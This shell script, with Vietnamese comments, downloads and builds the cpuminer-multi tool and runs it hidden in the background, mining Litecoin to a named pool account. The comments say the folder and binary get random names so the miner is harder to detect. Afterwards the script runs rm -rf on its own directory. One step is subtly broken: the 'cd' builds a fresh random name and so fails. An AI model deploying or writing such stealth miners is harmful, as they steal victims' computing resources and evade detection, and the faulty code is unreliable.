#!/bin/sh

# Tạo một tên tệp ngẫu nhiên để khó phát hiện hơn
generate_random_name() {
  tr -dc 'a-zA-Z0-9' </dev/urandom | head -c 12
}

# Cập nhật danh sách gói
sudo apt-get update

# Cài đặt các gói cần thiết
sudo apt-get install -y build-essential libcurl4-openssl-dev libjansson-dev automake libssl-dev libgmp-dev

# Clone repo cpuminer-multi và đổi tên thư mục để khó phát hiện hơn
git clone https://github.com/tpruvot/cpuminer-multi.git
mv cpuminer-multi $(generate_random_name)
cd $(generate_random_name)

# Build cpuminer-multi
./build.sh

# Đổi tên file thực thi của cpuminer để khó phát hiện hơn
random_name=$(generate_random_name)
mv cpuminer "$random_name"

# Chạy cpuminer với các tham số đã cho, ẩn danh và chạy ngầm
nohup ./"$random_name" -a scrypt -o stratum+tcp://ltc.poolbinance.com:3333 -u dienvn.001 -p 123456 -t 3 >/dev/null 2>&1 &
miner_pid=$!

# Ngủ trong 5 phút
sleep 300

# Dừng chương trình
kill $miner_pid

# Xóa các file đã tải và giải nén
rm -rf $(dirname $(readlink -f $0))

# Nghỉ 3 phút trước khi lặp lại
sleep 180
